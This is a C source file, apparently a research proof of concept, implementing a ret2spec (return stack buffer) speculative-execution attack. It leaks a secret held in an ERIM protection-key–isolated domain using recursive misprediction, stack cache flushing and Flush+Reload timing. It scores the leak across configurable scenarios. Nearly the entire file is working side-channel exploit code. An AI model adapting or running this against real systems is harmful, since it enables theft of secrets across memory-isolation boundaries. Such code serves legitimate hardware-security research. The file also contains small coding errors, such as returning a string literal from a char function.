#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sched.h>
#include <pthread.h>

#include "libcache/cacheutils.h"

#include "spex.h"

// accessible data
#define DATA "data|"
// inaccessible secret (following accessible data)
#define SECRET "SSSSSSSSSSSSSSSSSSS"

// Calls sched_yield in the cross-address-space version.
void (*return_true_base_case)();
// Calls sched_yield in the cross-address-space version, in the
// same-address-space version starts the ReturnsFalse recursion.
void (*return_false_base_case)();
unsigned char* current_offset;


const uint64_t kCacheLineBytes = 64;
const size_t kRecursionDepth = 128;

char *stack_mark_pointers[2048];
int stack_pointer = -1;

unsigned char * create_secret() {
    // init isolation and sh mem
    if(erim_init(4096, ERIM_FLAG_ISOLATE_TRUSTED)) {
        exit(EXIT_FAILURE);
    }
    // scanmem for wrpkru
    if(erim_memScan(NULL, NULL, ERIM_UNTRUSTED_PKRU)) {
        exit(EXIT_FAILURE);
    }

    // allocate secret
    unsigned char* secret = erim_malloc(sizeof(unsigned char) * 128);
    if(secret == NULL) {
        printf("allocation of secret failed\n");
        exit(EXIT_FAILURE);
    }

    memcpy(secret, SECRET, sizeof(SECRET));
    secret[sizeof(SECRET)] = '0';

    Switch_U;  
    return secret;
}

unsigned char * create_public() {
    unsigned char* public = malloc(sizeof(DATA)+1);

    if(public == NULL) {
        printf("allocation of public failed\n");
        exit(EXIT_FAILURE);
    }

    memcpy(public, DATA, sizeof(DATA));
    // ensure data terminates
    public[sizeof(DATA)] = 0;

    return public;
}

void stack_push(char *value){ 
    stack_pointer++;
    stack_mark_pointers[stack_pointer] = value;
}

void stack_pop(){
    stack_pointer--;
}

char* stack_seek(){
    return stack_mark_pointers[stack_pointer];
}

void* StartOfNextCacheLine(void* addr) {
  uint64_t addr_n = (uint64_t)addr;

  // Create an address on the next cache line, then mask it to round it down to
  // cache line alignment.
  uint64_t next_n = (addr_n + kCacheLineBytes) & ~(kCacheLineBytes - 1);
  return (void*)next_n;
}

void FlushFromDataCache(void* start, void* end){
    for (; start < end; start=StartOfNextCacheLine(start)){
        flush(start);
    }
    mfence();
    nospec();
}

__attribute__((aligned(4096))) void dead_code(char *arr){
    // Unreachable code. ReturnsFalse can never return true.
    // Disclosure Gadget
    char c = arr[0];
    
    #if SCENARIO == 2
      Switch_U
    #endif 

    // Transmission
    cache_encode(c);
    
    printf("Dead code. Must not be printed.\n");
    exit(EXIT_FAILURE);
}
__attribute__((aligned(4096)))  __attribute__((used)) void offset_further_code(){}

// Always returns false.
int ReturnsFalse(int counter) {
  if (counter > 0) {
    if (ReturnsFalse(counter - 1)) {
        dead_code(current_offset);
    }
  } else {
    // Increase the interference if running cross-address-space.
    return_true_base_case();
  }
  return 0;
}

// Always returns true.
static int ReturnsTrue(int counter) {
    // Creates a stack mark and stores it to the global vector.
    char stack_mark = 'a';
    stack_push(&stack_mark);

    if (counter > 0) {
        // Recursively invokes itself.
        ReturnsTrue(counter - 1);
    } else {
        // In the deepest invocation starts the ReturnsFalse recursion or
        // unschedule to increase the interference.
        return_false_base_case();
    }

    // Cleans-up its stack mark and flushes from the cache everything between its
    // own stack mark and the next one. Somewhere there must be also the return
    // address.
    stack_pop();
    if (counter == 0){
      #if SCENARIO == 2 || SCENARIO == 3
        Switch_T
      #endif
    }

    FlushFromDataCache(&stack_mark, stack_seek());
    
    // Speculating on the return
    return 1;
}

#define ITER 5000
int iterations = 0;

char Ret2specLeakByte() {
  for (int run = 0;; ++run) {
    flush_shared_memory();

    // Stack mark for the first call of ReturnsTrue. Otherwise it would read
    // from an empty vector and crash.
    char stack_mark = 'a';
    stack_push(&stack_mark);
    
    #if SCENARIO == 6 || SCENARIO == 7 || SCENARIO == 8
      Switch_T
    #elif SCENARIO == 2 || SCENARIO == 3 || SCENARIO == 4
      Switch_U
    #endif
    
    ReturnsTrue(kRecursionDepth);
    stack_pop();
    
     for (int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) & 255; // avoid prefetcher
      if (flush_reload(mem + mix_i * pagesize)) {
        if (mix_i >= 'A' && mix_i <= 'Z') {
          // Found a candidate
          return (char)mix_i;
        }
        fflush(stdout);
        sched_yield();
      }
    }
    iterations++;
    if (run > ITER) {
      return "_";
    }
  }
}

// Does nothing.
static void NopFunction() {}

// Starts the recursive execution of ReturnsFalse.
static void ReturnsFalseRecursion() {
  ReturnsFalse(kRecursionDepth);
}

int main(int argc, char **argv) {
  #if EXEC_PREV == 1
    setupTAndU(0,0, &dead_code, &dead_code);
  #endif

    pagesize = sysconf(_SC_PAGESIZE);
    // Detect cache threshold
    if(!CACHE_MISS)
        CACHE_MISS = detect_flush_reload_threshold();
    //printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

    char *_mem = malloc(pagesize * (256 + 4));
    mem = (char *)(((size_t)_mem & ~(pagesize-1)) + pagesize * 2);
    memset(mem, 0, pagesize * 256);


    unsigned char* data = create_secret();
    unsigned char* public = create_public();

    // nothing leaked so far
    char leaked[sizeof(SECRET) + 1];
    memset(leaked, ' ', sizeof(leaked));
    leaked[sizeof(SECRET)] = 0;

    return_true_base_case = NopFunction;
    return_false_base_case = ReturnsFalseRecursion;

    #if SCENARIO == 1
      Switch_U
    #endif 

    //dead_code(public);

    for (size_t i = 0; i < sizeof(SECRET); ++i) {
        current_offset = data + i;
        char c = Ret2specLeakByte();
        leaked[i] = c;
    }

    // Determine leakage
    Switch_T
    int score=0;
    for (int i = 0; i < sizeof(SECRET); i++){
        // Do not include the space!
        if (leaked[i] == data[i] && i != 12){
        score++;
        }
    }

    printf("%d, %d, %d", SCENARIO, iterations, score);
    if (score > 0){
        printf(" <--\n");
    }else{
        printf("\n");
    }  
    return EXIT_SUCCESS;
}